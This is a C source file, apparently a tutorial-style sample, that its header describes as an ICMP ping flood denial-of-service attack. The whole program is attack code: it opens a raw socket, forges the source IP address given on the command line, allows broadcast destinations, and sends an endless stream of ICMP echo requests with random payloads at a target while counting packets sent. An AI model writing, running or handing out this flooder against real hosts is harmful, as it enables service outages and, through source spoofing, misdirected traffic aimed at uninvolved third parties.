/**
	ICMP ping flood dos attack example in c
	Silver Moon
	m00n.silv3r@gmail.com
*/
 
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;netinet/ip.h&gt;
#include &lt;netinet/ip_icmp.h&gt;
#include &lt;unistd.h&gt;

typedef unsigned char u8;
typedef unsigned short int u16;

unsigned short in_cksum(unsigned short *ptr, int nbytes);
void help(const char *p);

int main(int argc, char **argv)
{
	if (argc &lt; 3) 
	{
		printf(&quot;usage: %s &lt;source IP&gt; &lt;destination IP&gt; [payload size]\n&quot;, argv[0]);
		exit(0);
	}
	
	unsigned long daddr;
	unsigned long saddr;
	int payload_size = 0, sent, sent_size;
	
	saddr = inet_addr(argv[1]);
	daddr = inet_addr(argv[2]);
	
	if (argc &gt; 3)
	{
		payload_size = atoi(argv[3]);
	}
	
	//Raw socket - if you use IPPROTO_ICMP, then kernel will fill in the correct ICMP header checksum, if IPPROTO_RAW, then it wont
	int sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	
	if (sockfd &lt; 0) 
	{
		perror(&quot;could not create socket&quot;);
		return (0);
	}
	
	int on = 1;
	
	// We shall provide IP headers
	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&amp;on, sizeof (on)) == -1) 
	{
		perror(&quot;setsockopt&quot;);
		return (0);
	}
	
	//allow socket to send datagrams to broadcast addresses
	if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&amp;on, sizeof (on)) == -1) 
	{
		perror(&quot;setsockopt&quot;);
		return (0);
	}	
	
	//Calculate total packet size
	int packet_size = sizeof (struct iphdr) + sizeof (struct icmphdr) + payload_size;
	char *packet = (char *) malloc (packet_size);
				   
	if (!packet) 
	{
		perror(&quot;out of memory&quot;);
		close(sockfd);
		return (0);
	}
	
	//ip header
	struct iphdr *ip = (struct iphdr *) packet;
	struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
	
	//zero out the packet buffer
	memset (packet, 0, packet_size);

	ip-&gt;version = 4;
	ip-&gt;ihl = 5;
	ip-&gt;tos = 0;
	ip-&gt;tot_len = htons (packet_size);
	ip-&gt;id = rand ();
	ip-&gt;frag_off = 0;
	ip-&gt;ttl = 255;
	ip-&gt;protocol = IPPROTO_ICMP;
	ip-&gt;saddr = saddr;
	ip-&gt;daddr = daddr;
	//ip-&gt;check = in_cksum ((u16 *) ip, sizeof (struct iphdr));

  	icmp-&gt;type = ICMP_ECHO;
	icmp-&gt;code = 0;
  	icmp-&gt;un.echo.sequence = rand();
  	icmp-&gt;un.echo.id = rand();
  	//checksum
	icmp-&gt;checksum = 0;
	
	struct sockaddr_in servaddr;
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = daddr;
	memset(&amp;servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));

	puts(&quot;flooding...&quot;);
	
	while (1)
	{
		memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);
		
		//recalculate the icmp header checksum since we are filling the payload with random characters everytime
		icmp-&gt;checksum = 0;
		icmp-&gt;checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size);
		
		if ( (sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &amp;servaddr, sizeof (servaddr))) &lt; 1) 
		{
			perror(&quot;send failed\n&quot;);
			break;
		}
		++sent;
		printf(&quot;%d packets sent\r&quot;, sent);
		fflush(stdout);
		
		usleep(10000);	//microseconds
	}
	
	free(packet);
	close(sockfd);
	
	return (0);
}

/*
	Function calculate checksum
*/
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
	register long sum;
	u_short oddbyte;
	register u_short answer;

	sum = 0;
	while (nbytes &gt; 1) {
		sum += *ptr++;
		nbytes -= 2;
	}

	if (nbytes == 1) {
		oddbyte = 0;
		*((u_char *) &amp; oddbyte) = *(u_char *) ptr;
		sum += oddbyte;
	}

	sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff);
	sum += (sum &gt;&gt; 16);
	answer = ~sum;

	return (answer);
}
